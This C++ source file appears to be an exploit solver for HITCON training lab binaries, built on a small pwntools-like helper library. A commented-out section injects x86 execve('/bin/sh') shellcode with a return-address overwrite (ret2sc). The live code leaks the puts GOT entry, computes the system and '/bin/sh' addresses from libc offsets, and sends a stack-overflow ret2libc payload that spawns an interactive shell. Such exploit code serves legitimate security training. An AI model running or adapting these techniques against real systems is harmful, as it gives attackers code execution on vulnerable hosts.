
#include <iostream>

#include "../process.h"
#include "../utility.h"
#include "../elf.h"

int main()
{
    try
    {
        //
        // lab
        //
        /*
        PROCESS p{"/tmp/hitcon/LAB/lab3/ret2sc"};
        std::cout << p.recv_until(":");

        char shellcode[] = "\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62"
                           "\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81"
                           "\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a"
                           "\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a"
                           "\x0b\x58\xcd\x80\x0a";
        p.send_line(shellcode);

        std::cout << p.recv_until(":");
        std::string payload = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

        UTILITY util;
        payload.append(util.p32(0x804a060));

        p.send_line(payload);
        p.interactive();
        */

        //
        // lab4
        //
        UTILITY util;
        PROCESS p("/tmp/hitcon/LAB/lab4/ret2lib");
        ELF e{"/tmp/hitcon/LAB/lab4/ret2lib"};
        const int puts_got{e.got("puts")};
        std::cout << "[*] found address of puts got : " << util.hex(puts_got) << std::endl;

        std::cout << p.recv_until(":");
        p.send(util.str(puts_got));
        std::string line{p.recv_line()};    //The content of the address : 0xf7d98290

        std::vector<std::string> vec;
        boost::split(vec, line, boost::is_any_of(":"));
        int puts_addr{(int)strtol(boost::algorithm::trim_copy(vec.at(1)).c_str(), NULL, 0)};

        const int sys_offset{0x2be70};
        const int binsh_offset{0x11e0c2};

        const int system_addr{puts_addr - sys_offset};
        const int binsh_addr{puts_addr + binsh_offset};

        std::cout << "[*] address of puts : " << util.hex(puts_addr) << std::endl;
        std::cout << "[*] address of system : " << util.hex(system_addr) << std::endl;
        std::cout << "[*] address of /bin/sh string : " << util.hex(binsh_addr) << std::endl;

        
        std::string payload;
        for(auto i = 0; i < 60; ++i)
        {
            payload.append("A");
        }
        payload.append(util.p32(system_addr));
        payload.append("AAAA");
        payload.append(util.p32(binsh_addr));

        std::cout << p.recv_until(":");
        p.send(payload);
        p.interactive();
    }
    catch (std::exception& e)
    {
        std::cerr << "Exception: " << __FUNCTION__ << " " << e.what() << "\n";
    }

    return 0;
}